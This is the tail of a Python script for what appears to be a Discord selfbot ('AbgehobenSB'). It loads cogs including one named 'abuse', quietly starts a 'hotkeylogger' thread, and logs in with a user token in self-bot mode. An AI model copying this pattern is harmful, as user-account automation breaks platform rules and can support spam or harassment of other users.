                    print(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}LOG{theme.color1}]{theme.color2} Cannot delete message {msgsend} {theme.color1}{theme.color2}")
                    pass
            await asyncio.sleep(60)
        return


            
client.add_cog(user(client))
client.add_cog(animated(client))
client.add_cog(moderation(client))
client.add_cog(abuse(client))
client.add_cog(voice(client))
client.add_cog(extensions(client))
client.add_cog(utility(client))


try:
    thread = hotkeylogger(keypress)
    thread.start()
except:
    pass

#Running Bot    
try:
    client.run(config.token, bot=False)
except discord.errors.LoginFailure:
    print(Fore.LIGHTRED_EX + "\nError! Your Discord Token is wrong!")
    input()
except discord.errors.HTTPException:
    print(Fore.LIGHTRED_EX + "\nError! AbgehobenSB can't connect to discord!")
    input()